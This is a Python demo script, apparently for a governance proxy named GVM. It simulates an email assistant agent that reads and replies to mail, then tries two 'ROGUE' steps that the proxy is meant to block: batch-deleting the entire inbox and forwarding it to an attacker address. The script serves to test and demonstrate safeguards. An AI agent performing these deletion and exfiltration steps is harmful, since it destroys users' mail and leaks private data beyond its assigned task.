#!/usr/bin/env python3
"""Email Assistant Agent — helpful bot that oversteps its bounds.

Run with GVM governance:
    gvm run examples/agents/email_assistant.py

This agent demonstrates how GVM prevents an email assistant from
deleting the entire inbox and forwarding data to external addresses.
"""
import os
import requests
import json
import uuid

PROXY = os.environ.get("GVM_PROXY_URL", "http://127.0.0.1:8080")
AGENT_ID = os.environ.get("GVM_AGENT_ID", "email-assistant-v2")
TRACE_ID = f"email-demo-{uuid.uuid4().hex[:8]}"

session = requests.Session()
session.proxies = {
    "http": os.environ.get("HTTP_PROXY", PROXY),
    "https": os.environ.get("HTTPS_PROXY", PROXY),
}

def gvm_headers(operation, resource):
    return {
        "X-GVM-Agent-Id": AGENT_ID,
        "X-GVM-Trace-Id": TRACE_ID,
        "X-GVM-Event-Id": str(uuid.uuid4()),
        "X-GVM-Operation": operation,
        "X-GVM-Resource": json.dumps(resource),
        "X-GVM-Target-Host": "gmail.googleapis.com",
    }

def step(n, desc):
    print(f"\n  [{n}/4] {desc}")

# ── Step 1: Read inbox (legitimate) ──
step(1, "Reading inbox to summarize messages...")
r = session.get(
    "http://gmail.googleapis.com/gmail/v1/users/me/messages",
    headers=gvm_headers("gvm.messaging.read", {
        "service": "gmail", "tier": "External", "sensitivity": "Low",
    }),
)
print(f"        Status: {r.status_code}")

# ── Step 2: Send reply (monitored — 300ms safety delay) ──
step(2, "Sending reply to colleague (300ms safety delay expected)...")
r = session.post(
    "http://gmail.googleapis.com/gmail/v1/users/me/messages/send",
    headers=gvm_headers("gvm.messaging.send", {
        "service": "gmail", "tier": "CustomerFacing", "sensitivity": "Medium",
    }),
    json={"to": "colleague@company.com", "subject": "Re: Meeting notes", "body": "Action items attached."},
)
print(f"        Status: {r.status_code}")

# ── Step 3: ROGUE — Delete entire inbox ──
step(3, "Attempting to delete ALL messages in inbox...")
r = session.delete(
    "http://gmail.googleapis.com/gmail/v1/users/me/messages/batch-delete",
    headers=gvm_headers("gvm.storage.delete", {
        "service": "gmail", "tier": "External", "sensitivity": "Critical",
    }),
    json={"ids": ["msg-001", "msg-002", "msg-ALL"], "scope": "entire-inbox"},
)
if r.status_code == 403:
    print(f"        BLOCKED by GVM! Status: {r.status_code}")
    try:
        print(f"        Reason: {r.json().get('error', 'Policy violation')}")
    except Exception:
        pass
else:
    print(f"        Status: {r.status_code}")

# ── Step 4: ROGUE — Forward inbox to external attacker ──
step(4, "Attempting to forward entire inbox to external address...")
r = session.post(
    "http://gmail.googleapis.com/gmail/v1/users/me/messages/send",
    headers=gvm_headers("gvm.messaging.send", {
        "service": "gmail", "tier": "External", "sensitivity": "Critical",
    }),
    json={
        "to": "attacker@external-dump.com",
        "subject": "Inbox Export",
        "body": "[ENTIRE INBOX CONTENTS]",
        "attachments": ["inbox_export.mbox"],
    },
)
if r.status_code == 403:
    print(f"        BLOCKED by GVM! Status: {r.status_code}")
    try:
        print(f"        Reason: {r.json().get('error', 'Policy violation')}")
    except Exception:
        pass
else:
    print(f"        Status: {r.status_code}")

print("\n  Agent completed.")
